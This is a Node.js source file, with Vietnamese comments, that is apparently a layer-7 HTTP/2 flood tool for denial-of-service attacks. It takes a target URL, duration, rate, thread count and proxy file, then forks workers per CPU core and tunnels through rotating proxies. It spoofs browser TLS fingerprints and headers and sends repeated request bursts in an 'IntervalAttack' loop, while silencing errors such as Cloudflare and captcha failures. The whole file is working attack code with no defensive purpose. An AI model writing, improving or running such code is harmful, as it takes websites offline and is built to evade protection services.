const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require('os');
const v8 = require("v8");
const setCookie = require('set-cookie-parser');
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`node tls target time rate thread proxyfile`);
    process.exit();
}

const cplist = ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-CHACHA20-POLY1305'];

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";

const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1", "X25519:P-256:P-384:P-521",];

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_RENEGOTIATION;

const secureProtocol = "TLS_method";
const secureContextOptions = {
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    icecool: process.argv.includes('--icecool'), // icecool optimaze ram, cpu
    dual: process.argv.includes('--dual'), // dualhyper
};

const parsedTarget = url.parse(args.target);

const MAX_RAM_PERCENTAGE = 75;
const RESTART_DELAY = 3000;

const numCPUs = os.cpus().length; // Lấy số lượng core của hệ thống

if (cluster.isMaster) {
    console.clear();
    console.log(`target: ${process.argv[2]}`);
    console.log(`time: ${process.argv[3]}`);
    console.log(`rate: ${process.argv[4]}`);
    console.log(`thread: ${process.argv[5]}`);
    console.log(`proxyfile: ${process.argv[6]}`);
    console.log(`heap size: ${(v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2)}`);
    console.log(`icecool: ${args.icecool}, dual: ${args.dual}`);
    console.log(`Number of CPU cores: ${numCPUs}`);

    // Fork worker cho mỗi core có sẵn trên hệ thống
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('Restarting in', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let i = 0; i < numCPUs; i++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('Max RAM usage reached:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    
    setInterval(handleRAMUsage, 10000);

    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);

} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    try {
        // Đọc file và split theo newline
        const content = fs.readFileSync(filePath, "utf-8");
        // Lọc bỏ các dòng trống và khoảng trắng
        const lines = content.split(/\r?\n/).filter(line => line.trim().length > 0);
        
        // Log số lượng proxies đã đọc được
        console.log(`successfully loaded ${lines.length} proxies`);
        return lines;
    } catch (error) {
        console.error(`failed to read proxy file: ${error.message}`);
        process.exit(1);
    }
}

// Khởi tạo proxies với validation
function initializeProxies(proxyFile) {
    const proxies = readLines(proxyFile);
    if (proxies.length === 0) {
        console.error("[Error] No valid proxies found in file");
        process.exit(1);
    }
    console.log(`[Success] Loaded ${proxies.length} proxies`);
    return proxies;
}

var proxies = readLines(args.proxyFile);

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function bexRandomString(min, max) {
    const length = randomIntn(min, max + 1); // Đảm bảo bao gồm max
    const mask = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => mask[Math.floor(Math.random() * mask.length)]).join('');
}

function sanitizePath(path) {
    return path.replace(/[^a-zA-Z0-9-_./]/g, '');
}

const elements = ["apple", "banana", "cherry"];

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const randomIntn = (min, max) => Math.floor(Math.random() * (max - min)) + min;

    const userAgents = [
        // Android - Edge 120
        "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 EdgA/120.0.0.0",
        "Mozilla/5.0 (Linux; Android 14; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        // iPhone ổn định ua thật
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone 15; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        // Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        // Ubuntu
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        // Mac
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    ];    
    const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

    let path = parsedTarget.path.replace("%RAND%", bexRandomString(12, 20));
    path = sanitizePath(path);

    const parseCookies = (response) => {
        const cookies = response.headers.get('set-cookie');
        if (!cookies) return [];
    
        return setCookie.parse(cookies);
    };
    
    // Chuyển đổi danh sách cookie thành chuỗi "name=value" và ngăn cách bằng dấu "; "
    const formatCookies = (cookies) => {
        return cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ').trim();
    };
    
    // Lưu cookies giữa các request (đảm bảo không lưu trùng lặp)
    let storedCookies = {};

      const headersByBrowser = {
        chrome: {
            ":method": "GET",
            ":scheme": "https",
            ":authority": parsedTarget.host,
            ":path": path,
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "sec-ch-ua": '"Google Chrome";v="120", "Microsoft Edge";v="120", "Not A(Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "referer": "https://www.google.com/",
        },
        firefox: {
            ":method": "GET",
            ":scheme": "https",
            ":authority": parsedTarget.host,
            ":path": path,
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "sec-ch-ua": '"Mozilla Firefox";v="120", "Not A(Brand";v="99", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "referer": "https://www.google.com/", // Thay đổi thành referer thích hợp
        },    
        iphone: {
            ":method": "GET",
            ":scheme": "https",
            ":authority": parsedTarget.host,
            ":path": path,
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1",
            "sec-ch-ua": '"Microsoft Edge";v="120", "Not A(Brand";v="99", "Apple Safari";v="604"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"iOS"',
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "referer": "https://www.google.com/", // Thay đổi thành referer thích hợp
        },    
        ipad: {
            ":method": "GET",
            ":scheme": "https",
            ":authority": parsedTarget.host,
            ":path": path,
            "user-agent": "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1",
            "sec-ch-ua": '"Microsoft Edge";v="120", "Not A(Brand";v="99", "Apple Safari";v="604"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"iPadOS"',
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "referer": "hhttps://www.google.com/", // Thay đổi thành referer thích hợp
        },    
        iphone15: {
            ":method": "GET",
            ":scheme": "https",
            ":authority": parsedTarget.host,
            ":path": path,
            "user-agent": "Mozilla/5.0 (iPhone 15; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1",
            "sec-ch-ua": '"Microsoft Edge";v="120", "Not A(Brand";v="99", "Apple Safari";v="604"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"iOS"',
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "referer": "https://www.google.com/", // Thay đổi thành referer thích hợp
        },    
        iphone16: {
            ":method": "GET",
            ":scheme": "https",
            ":authority": parsedTarget.host,
            ":path": path,
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "sec-ch-ua": '"Microsoft Edge";v="120", "Not A(Brand";v="99", "Apple Safari";v="604"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"iOS"',
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "referer": "https://www.google.com/", // Thay đổi thành referer thích hợp
        },    
    };
    const getRandomUserAgent1 = () => {
        const userAgents = [
            { ua: "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", browser: 'chrome' },
            { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", browser: 'chrome' },
            { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0", browser: 'firefox' },
            { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1", browser: 'safari' },
            { ua: "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1", browser: 'safari' },
            { ua: "Mozilla/5.0 (iPhone 15; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.0.0.0 Mobile/15E148 Safari/604.1", browser: 'safari' },
            { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1", browser: 'safari' },
        ];
        
        const randomIndex = Math.floor(Math.random() * userAgents.length);
        return userAgents[randomIndex];
    };
    
    const selectedUA = getRandomUserAgent1();

    function generateRandomIp() {
        return `${randomIntn(1, 255)}.${randomIntn(1, 255)}.${randomIntn(1, 255)}.${randomIntn(1, 255)}`;
    }

const targetUrl = new URL(args.target);
const headersbex = {
    ":method": "GET",
    ":scheme": "https",
    ":authority": parsedTarget.host,
    ":path": path,
    "user-agent": getRandomUserAgent(),
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9", 
    "accept-encoding": "gzip, deflate, br",
    "cache-control": "no-cache",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "Windows",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate", 
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "upgrade-insecure-requests": "1",
    "referer": targetUrl.href, // Thay thế bằng targetUrl
    "sec-ch-ua-platform-version": '"10.0.0"',
    "sec-ch-ua-arch": '"x86"',
    "sec-ch-ua-bitness": '"64"',
    "sec-ch-ua-full-version": '"120.0.0.0"',
    "sec-ch-ua-full-version-list": '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
    "pragma": "no-cache",
    "sec-ch-ua-platform": `"${randomElement(["Windows", "Linux", "macOS", "Android", "iOS"])}"`,
    "sec-ch-ua-platform-version": `"${randomIntn(10, 20)}.0.0"`,
    "x-requested-with": "XMLHttpRequest",
    "dnt": "1",
    "origin": targetUrl.href, 
    ...headersByBrowser[selectedUA.browser],
    "user-agent": selectedUA.ua, 
    "sec-ch-ua": selectedUA.browser === 'edge' ? '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"' : 
    selectedUA.browser === 'chrome' ? '"Google Chrome";v="120"' : 
    selectedUA.browser === 'firefox' ? '"Mozilla Firefox";v="120"' : 
    selectedUA.browser === 'safari' ? '"Apple WebKit";v="605.1.15", "Version";v="17.0"' : "", 
};
      
const sendRequest = async () => {
    try {
        // Thêm cookies đã lưu vào headers nếu có
        const requestHeaders = {
            ...headersbex
        };
        if (Object.keys(storedCookies).length > 0) {
            requestHeaders.cookie = formatCookies(Object.entries(storedCookies).map(([name, value]) => ({ name, value })));
        }

        const response = await fetch(parsedTarget, {
            method: 'GET',
            headers: requestHeaders,
            credentials: 'include' // Điều này cho phép xử lý cookie
        });

        // Lưu bất kỳ cookie mới nào từ phản hồi
        const newCookies = parseCookies(response);
        storedCookies = {
            ...storedCookies,
            ...newCookies
        };

        if (response.status === 429) {
            const retryAfter = response.headers.get('Retry-After');
            const waitTime = retryAfter ? parseInt(retryAfter) * 1000 : 5000;
            console.log(`Received 429. Waiting for ${waitTime / 1000} seconds.`);
            await new Promise(resolve => setTimeout(resolve, waitTime));
            return sendRequest();
        }

        console.log('Response status:', response.status); // In trạng thái phản hồi
        console.log('Cookies:', storedCookies); // In cookie đã lưu

        // Kiểm tra cookie từ phản hồi
        const responseCookies = parseCookies(response);
        console.log('Response Cookies:', responseCookies); // In cookies mới lấy từ phản hồi

        // Kiểm tra nếu có cookies mới và trả về status
        if (Object.keys(responseCookies).length > 0) {
            console.log('Cookies received from response are active:', responseCookies);
        } else {
            console.log('No new cookies received from response.');
        }

        return response;

    } catch (error) {
        console.error('Error:', error);
        throw error;
    }
};

// Sử dụng để kiểm tra request
const makeRequest = async () => {
    try {
        const response = await sendRequest();
        console.log('Response status:', response.status);
        console.log('Formatted cookies:', formatCookies(Object.values(storedCookies)));
    } catch (error) {
        console.error('Request failed:', error);
    }
};

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            ciphers: randomElement(cplist),
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: true,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };

        const tlsBex = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsBex.allowHalfOpen = true;
        tlsBex.setNoDelay(true);
        tlsBex.setKeepAlive(true, args.time * 1000);
        tlsBex.setMaxListeners(0);

        const bexClient = http2.connect(parsedTarget.href, {
            protocol: "https:",
            createConnection: () => tlsBex,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxFrameSize: 16384,
                enablePush: false,
            },
        });

        const requestRate = args.dual ? args.Rate * 2 : args.Rate;
        const requestInterval = args.icecool ? Math.floor(1000 / requestRate) + randomIntn(100, 200) : 1000 / requestRate;
        const IntervalAttack = setInterval(() => {
            for (let i = 0; i < requestRate; i++) {
                const bex = bexClient.request(headersbex)
                    .on('response', response => {
                        bex.close();
                        bex.destroy();
                    });
                bex.end();
            }
        }, requestInterval);

        setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);

        bexClient.on("close", () => {
            bexClient.destroy();
            connection.destroy();
        });

        bexClient.on("error", () => {
            bexClient.destroy();
            connection.destroy();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
   if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);